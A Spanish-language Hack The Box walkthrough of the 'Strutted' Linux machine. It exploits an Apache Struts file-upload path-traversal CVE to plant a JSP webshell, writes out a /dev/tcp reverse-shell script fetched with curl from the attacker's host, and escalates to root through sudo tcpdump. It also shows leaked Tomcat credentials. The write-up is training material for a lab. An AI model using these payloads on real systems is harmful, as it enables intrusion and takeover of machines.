STRUTTED - HACK THE BOX

## SO: LINUX

## DIFICULTAD: Medium 

![strutted](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/HTB/images/strutted/strutted.png)0
**IP ATTACK -> 10.10.11.59**

## RECONOCIMIENTO 
Como siempre, podemos empezar haciendo un ping a la maquina para ver si esta activa y mediante el TTL(Time-To-Live) identificar el SO de la máquina, aunque ya lo sabemos pero nunca está de mas saber estas cosas.
Tomaremos de referencia los valores que ofrece el TTL si: 
TTL=127-128 -> WINDOWS
TTL=63-64 -> LINUX

![ping](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/HTB/images/strutted/ping.png)

Ahora que ya sabemos que tenemos conexión, procedemos a hacer un escaneo de puertos con ``nmap`
```ruby
nmap -p- -sS -sCV --open --min-rate 5000 -Pn -n -vvv 10.10.11.59 
```
| Parámetro         | Descripción                                                                                                                              |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`            | Inicia la herramienta Nmap (Network Mapper), usada para escanear redes.                                                                  |
| `-p-`             | Escanea todos los 65535 puertos TCP, no solo los más comunes.                                                                            |
| `-sS`             | Realiza un escaneo SYN (también conocido como escaneo sigiloso o "half-open"), rápido y menos detectable.                                |
| `-sCV`            | Combina dos opciones:  <br>- `-sV`: Detecta versiones de los servicios.  <br>- `-sC`: Usa los **scripts NSE por defecto** para más info. |
| `-open`           | Solo muestra puertos **abiertos**, oculta los cerrados/filtrados.                                                                        |
| `--min-rate 5000` | Fuerza una **tasa mínima de 5000 paquetes por segundo**, para escaneo rápido (agresivo).\|                                               |
| `-Pn`             | Le dice a Nmap que **no haga ping** (host discovery), asume que el host está **activo**. Útil si el firewall bloquea ICMP.               |
| `-n`              | Desactiva la resolución DNS. Escanea usando solo direcciones IP.                                                                         |
| `-vvv`            | Modo **verboso** nivel 3. Muestra muchos detalles del progreso.                                                                          |
| `10.10.11.59`     | Dirección IP del **objetivo**.                                                                                                           |
| `-oN portsOpen`   | Guarda el resultado en un archivo llamado `portsOpen` en **formato legible para humanos**.\|                                             |

![nmap](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/HTB/images/strutted/nmap.png )

Podemos observar 2 puertos abiertos que son:
- *22 -> SSH* : Servicio SSH habilitado 
- *80 -> HTTP* : Servicio web, y además se esta aplicando un virtual hosting, porque al momento de ingresar a la IP de la maquina no nos encontramos con nada:
Agregamos el dominio `strutted.htb` al `/etc/hosts`

![/etc/hots]()

*Si accedemos a la web podemos encontrar lo siguiente, un FIle Upload, si pulsamos en download nos descarga un comprimido .zip, podemos ver un preview*
![web]()

```ruby
7z l strutted.zip
```

Observamos cosas como un `Dockerfile`

![docker_file]()
![tomcat-users.xml]()

*Algo muy interesante es encontrarnos con un tomcat-user.xml, porque justamente en este archivo se definen los usuarios y sus roles en TOMCAT, podemos revisar las siguiente rutas:
- `/manager/html` → consola de administración
- `/host-manager/html` → consola de gestión de hosts virtuales

![manager_html]()

*Encontramos cierta información, que podriamos usar mas adelante, pero vamos a ver el contenido del `.xml`

![xml_content]()

Son unas credenciales `admin:skqKY6360z!Y`, vamos a ver si mas adelante le sacamos provecho

*Si seguimos viendo o revisando los archivos encontramos algo que nos llama la atención en el archivo `pom.xml`, nos proporciona lo siguiente:*
![pomxml]()
*Encontramos versiones asi mismo de la que se esta utilizando en `Apache Struts`


**Apache Struts** es un **framework de desarrollo web en Java**, de **código abierto**, diseñado para facilitar la creación de aplicaciones web basadas en el patrón **MVC (Modelo-Vista-Controlador)**.`*

Al saber esto podemos buscar si es que se encuentra alguna vulnerabilidad con respecto a lo anterior

![cve]()

*Podemos ver que encontramos un CVE-2024-53677, muy reciente por cierto, que dice que: `Podemos manipular los parámetros del archivo a cargar y hacer una ejecucion remota de código, aplica para las versiones desde la 2.0.0 - 6.4.0

También revisando el `Dockerfile` al parecer se esta utilizando java como lenguaje*

![dockerfile_content]()


*Revisando algunos PoC, Códigos en Git, al parecer efectivamente podemos poder cargar un archivo con extensión `.jsp`
![PoC_Github]()

*Podemos echar un ojo con CAIDO, que por cierto sospechamos de una subida de un archivo con formato `JPS`, como nos reporto el `/manager/html` de Tomcat

![caido_1]()

*Revisando un poco con CAIDO, podemos observar que solo se nos interpreta la ruta si subimos archivos con las extensiones que nos proporciona en la web, NUESTRA INTENCION ES TRATAR DE SUBIR UN `.jsp` PERO NO TENEMOS ÉXITO*

![caido_2]()

*Entonces en `APACHE STRUTS`, existe un concepto que se llama `INTERCEPTOR(Un Interceptor en Struts es como un filtro que se ejecuta antes y/o después de una acción (`Action`)`, basicamente este exploit se basa en aprovecharse del interceptor de File Upload, el problema surge que el interceptor confia en lo que se sube y si se le concatena un Path Traversal para guardar en una ruta específica Struts lo hará

![vul_github]()

En esta parte de fragmento de código es donde se ve mejor el exploit, actua de la siguiente manera: 
1. Tú haces un `POST` con:
    
    - `Upload` = archivo `.jsp` con una webshell.
    - `top.UploadFileName` = ruta peligrosa como `../../../../../webapps/ROOT/shell.jsp`
2. Struts lo guarda ahí sin preguntar.
3. Luego visitas `http://victima.com/shell.jsp` y ya tienes **ejecución remota de comandos**.

Y como se puede observar el interceptor se activa cuando lee el archivo `Upload`, con mayúscula al inicio, cosa que en CAIDO nos esta mostrando que se envía `upload`

![caido_3]()

Podemos jugar con los campos de acuerdo al Exploits y vemos que si cambiamos algunos parámetros y activamos el Interceptor, nos guarda el archivo sin importar las restricciones de extensión
Entonces lo que haremos es buscar una `webshell JPS` y copiaremos su contenido y aplicaremos un PATH TRAVERSAL hacia la raíz de la siguiente manera:

WebShell: [WebShell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp)

![web_shell]()
![caido_4]()

Ahora solo nos queda buscar en la web:

```python
http://strutted.htb/test.jsp
```
![web_jsp]()
Como podemos ver tenemos una web Shell, si queremos hacer un intento de reverse Shell hacia nuestra maquina no podemos, pero si podemos usar herramientas como curl o wget

Primero en nuestra maquina atacante vamos a crear un archivo de extensión html en este caso, porque probé y funcionó de primera, va a contener código de una reverse Shell

```ruby
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.220/443 0>&1
```
Una vez hecho esto nos levantamos un servidor local con Python

![server_python]()

De parte de la web Shell vamos a hacer lo siguiente
```ruby
curl 10.10.14.220:8000 -o /tmp/reverseshell
```
luego
```python
bash /tmp/revershell
```

OJO: para hacer eso deben estar en modo listening con netcat en la maquina atacante
```ruby
nc -nlvp <port>
```
![listening_netcat]()

Obtendremos una bash en nuestra maquina atacante, podemos hacer un tratamiento de la tty para operar mejor

```ruby
script /dev/null -c bash
stty raw echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
```
## ESCALADA DE PRIVILEGIOS
Observamos el /etc/passwd y tenemos un usuario llamado james

![etc_passwd]()

Buscando vectores para una posible escalada de privilegios, no hemos encontrado permisos SUID, capabilties, procesos, ni con sudo -l
si buscamos por `tomcat-users.xml`, para ver si se contemplan mas usuarios como vimos al inicio, nos encontramos una ruta
![ruta_tomcatUsers]()
![tomcat_users]()

Podemos ver de nuevo al usuario admin pero con otra contraseña, recordando que ya habíamos tenido anteriormente que es esta:

![credenciales_anteriores]()


Como ninguna contraseña funciona para migrar de usuarios, me puse a pensar y recordé que tenia el puerto ssh abierto, y se me dió por probar ahí:

![ssh_login]()

### 1era Flag

![1eraFlag]()

Vemos si podemos escalar privilegios con sudo -l, y tenemos lo siguiente:

![sudoL]()

Cualquier usuario sin proporcionar contraseña puede ejecutar `tcpdump`, podemos usar la página de [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/) para ver una vía de escalada de privilegios

![gtfObins]()

Otorgamos permisos SUID a la bash, y seguimos los pasos de GTFObins y Bingo, somo root
ya podemos ver la flag:

![escalada_james]()

### 2da flag Root

![root]()

## HEMOS RESUELTO LA MAQUINA 








